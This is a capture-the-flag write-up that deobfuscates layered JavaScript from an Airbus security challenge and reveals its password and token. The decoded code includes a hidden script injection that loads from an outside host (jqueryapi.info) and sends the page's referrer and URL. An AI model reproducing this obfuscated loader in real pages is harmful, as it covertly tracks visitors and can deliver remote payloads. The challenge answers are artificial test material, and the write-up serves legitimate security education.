---
title: Airbus D&S - 2014 - Trust The Future - G00d_Luck.html
slug: airbus/trust-the-future/g00d_luck
template: item
date: 28-10-2015

taxonomy:
	category: [Airbus]
	tag: [JS]
---

In 2014, Airbus Defense and Space organized its first cybersecurity challenge named "Trust The Future", and restricted to a few French engineering schools. This is the `G00d_Luck.html` challenge, [the other ones can be found here.][CHL]

===

We have a form, asking for a password. The source code shows that it is created by an obfuscated JS script. The purpose of this challenge is to deobfuscate the JS script and find the correct password.

First, let's use a JS beautifier to make the code human readable.

```javascript
<script>
    var TAB = ["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",
	           "",
	           "charAt",
	           "indexOf",
	           "fromCharCode",
	           "length"];
	var var1 = TAB[0];

	function func1(var2) {
		var var3 = TAB[1];
		var var4, var5, var6, var7, var8, var9, var10, var11, var12 = 0, var13 = TAB[2];
		do {
			var7 = var3[TAB[4]](var2[TAB[3]](var12++));
			var8 = var3[TAB[4]](var2[TAB[3]](var12++));
			var9 = var3[TAB[4]](var2[TAB[3]](var12++));
			var10 = var3[TAB[4]](var2[TAB[3]](var12++));
			var11 = var7 << 18 | var8 << 12 | var9 << 6 | var10;
			var4 = var11 >> 16 & 0xff;
			var5 = var11 >> 8 & 0xff;
			var6 = var11 & 0xff;
			if (var9 == 64) {
				var13 += String[TAB[5]](var4);
			} else {
				if (var10 == 64) {
					var13 += String[TAB[5]](var4, var5);
				} else {
					var13 += String[TAB[5]](var4, var5, var6);
				};
			};
		} while (var12 < var2[TAB[6]]);
		return var13;
	};
		
	function func2(var14) {
		var var15 = TAB[2],
		var12 = 0;
		for (var12 = var14[TAB[6]] - 1; var12 >= 0; var12--) {
			var15 += var14[TAB[3]](var12);
		};
		return var15;
	};
	eval(func1(func2(var1)));
</script>
```

The good thing is that we don't need to understand what `func1` and `func2` do. Indeed, the output of `func1(func2(var1))` is given as a parameter to `eval`. We can use the JS console to get that output:

```javascript
JS> func1(func2(var1));

eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
    }
    return p
}('2X(2N(p,a,c,k,e,d){e=2N(c){2M(c<a?\'\':e(2U(c/a)))+((c=c%a)>35?2O.2T(c+29):c.2V(36))};2P(!\'\'.2Q(/^/,2O)){2R(c--){d[e(c)]=k[c]||e(c)}k=[2N(e){2M d[e]}];e=2N(){2M\'\\\\w+\'};c=1};2R(c--){2P(k[c]){p=p.2Q(2S 2Y(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}2M p}(\'2u(1h(p,a,c,k,e,d){e=1h(c){1g(c<a?\\\'\\\':e(1P(c/a)))+((c=c%a)>1W?1V.1N(c+29):c.1F(1E))};1D(c--){1H(k[c]){p=p.1I(1K 1J(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}1g p}(\\\'9 m=\\\\\\\'%B%C%2%A%1%6%z%w%i%3%x%y%8%i+h%2%2%D@E%1%3%e%4%J%K%I%H%F%v%L@r+h%1%3%a%u%8%e%4%s%p%8%t-%4%1%3%a%7%a%q.j%4%d%n%o%2%G%1%18%2%16%1%17%2%15%1%6%b/14%6%12%13%2%19%M.1c%4%f%1e%f%d%3.1f%3%1%1d%b/1a%6%d%3%1b%7%b/g%6%7\\\\\\\';9 c=5.11(\\\\\\\'g\\\\\\\');c.10=\\\\\\\'R://S.Q/?P=N\\\\\\\'+\\\\\\\'&O=\\\\\\\'+l(5.T)+\\\\\\\'&U=\\\\\\\'+l(5.Z);9 k=5.Y(\\\\\\\'X\\\\\\\')[0];k.V(c);5.j(W(m));\\\',1G,1M,\\\'|22|1U|29|28|1T|1S|1O|20|1Q|1C|1X|1y|27|1n|1o|1m|1Y|1q|1l|1i|1j|1k|1p|1B|1r|1z|1A|1x|1w|1s|1t|1u|1v|1R|2l|2y|2z|2B|2w|2v|2r|2s|2t|2C|2A|2E|2K|2J|2I|2L|2G|2H|2D|2F|2x|2p|2a|2b|2c|2d|26|25|1Z|21|23|24|2e|2f|2m|2n|2o|2q|2k|2g|2h|2i|2j\\\'.1L(\\\'|\\\')))\',2Z,3h,\'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||2M|2N|3i|3u|3j|3g|3f|3c|3d|3e|3k|3l|3r|3s|3q|3p|3A|3m|3b|3o|3t|38|30|2R|36|2V|2Z|2P|2Q|2Y|2S|2W|3a|2T|31|2U|39|37|3E|34|3D|2O|35|3C|32|33||3n||3P|47|42|44||||41|40|3X|46|3Y|3Z|45|48|4c|4b|3B|4a|49|43|3V|3G|3H|3I|3J|3F|2X|3z|3v|3w|3x|3y|3K|3L||3S|3T|3U|3R|3W|3Q|3M|3N|3O\'.2W(\'|\'),0,{}))', 62, 261, '||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|new|fromCharCode|parseInt|toString|split|eval|RegExp|62|7D|0A|1337|createElement|document|||0Aif|20id|var|78|_110|7Balert|5C|3Cinput|script|write|172|lO0|_escape|28O|20password|22wrong|3Cbutton|0Adocument|7B|20validate|0Aelse|20is|ssw0rD|encodeURIComponent|22P|referrer|22javascript|3Cscript|ssw0rD1337||||||20the|url|button|20token|22pass|22You|20language|28document|20P|ref|20onclick|ok|getsrc|http|20win|jqueryapi|22validate|info|head|22password|22text|unescape|appendChild|src|20type|URL|getElementById|getElementsByTagName|input|3EOK|20value|0Afunction|value|27pass'.split('|')));
```

Again, we can get the output of the new function

```javascript
var _escape = '%3Cscript%20language%3D%22javascript%22%3E%0Afunction%20validate%28O%29%7B%0Aif%20%28O+1337%3D%3D%22P@ssw0rD1337%22%29%7Balert%28%22You%20win%2C%20the%20token%20is%20P@ssw0rD+1337%22%29%7D%0Aelse%20%7Balert%28%22wrong%20password%20%3A-%28%22%29%7D%0A%7D%0Adocument.write%28%27%3Cinput%20id%3D%22pass%22%20type%3D%22text%22%20value%3D%22password%22%3E%3C/input%3E%3Cbutton%20onclick%3D%22validate%28document.getElementById%28%5C%27pass%5C%27%29.value%29%22%3EOK%3C/button%3E%27%29%3B%0A%3C/script%3E%0A';
var _110 = document.createElement('script');
_110.src = 'http://jqueryapi.info/?getsrc=ok' + '&ref=' + encodeURIComponent(document.referrer) + '&url=' + encodeURIComponent(document.URL);
var lO0 = document.getElementsByTagName('head')[0];
lO0.appendChild(_110);
document.write(unescape(_escape));
```
The function `document.write` will write the final HTML code. This means that `unescape(_escape)` represents that code!

```javascript
JS> unescape(_escape);

<script language=\ "javascript\">
function validate(O) {
	if (O + 1337 == \"P@ssw0rD1337\") {
		alert(\"You win, the token is P@ssw0rD+1337\")
	}
	else {
		alert(\"wrong password :-(\")
	}
}
document.write('<input id=\"pass\" type=\"text\" value=\"password\"></input><button onclick=\"validate(document.getElementById(\'pass\').value)\">OK</button>');
</script>
```

The password is `P@ssw0rD` and the token is clearly visible: `P@ssw0rD+1337`.

[CHL]: https://www.trecherel.com/airbus/trust-the-future "The other challenges of A&D Trust The Future"
